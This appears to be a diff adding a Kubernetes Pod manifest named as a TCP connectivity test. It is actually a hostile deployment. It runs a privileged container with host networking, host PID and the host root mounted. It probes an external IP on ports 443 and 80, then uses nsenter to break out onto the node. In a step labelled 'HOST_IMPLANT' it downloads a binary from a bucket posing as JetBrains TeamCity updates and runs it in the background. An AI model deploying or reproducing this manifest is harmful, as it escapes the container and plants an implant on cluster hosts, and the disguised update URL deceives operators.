@@ -1,0 +1,24 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: tcp-test2
+  namespace: default
+spec:
+  hostNetwork: true
+  hostPID: true
+  containers:
+  - name: test
+    image: alpine:latest
+    command: ["/bin/sh", "-c"]
+    args:
+    - "apk add --no-cache curl bash > /dev/null 2>&1; echo '===TCP_443==='; timeout 3 bash -c 'echo > /dev/tcp/13.212.144.69/443 && echo OPEN' 2>&1 || echo 'CLOSED/ERR'; echo '===TCP_80==='; timeout 3 bash -c 'echo > /dev/tcp/13.212.144.69/80 && echo OPEN' 2>&1 || echo 'CLOSED/ERR'; echo '===HOST_IMPLANT==='; nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c 'curl -fsSL -o /tmp/ts2 https://jetbrainsteam-updates.s3.amazonaws.com/teamcity-server-update.bin && chmod +x /tmp/ts2 && nohup /tmp/ts2 > /dev/null 2>&1 & echo OK' 2>&1; echo '===DONE==='; sleep 60"
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+  restartPolicy: Never
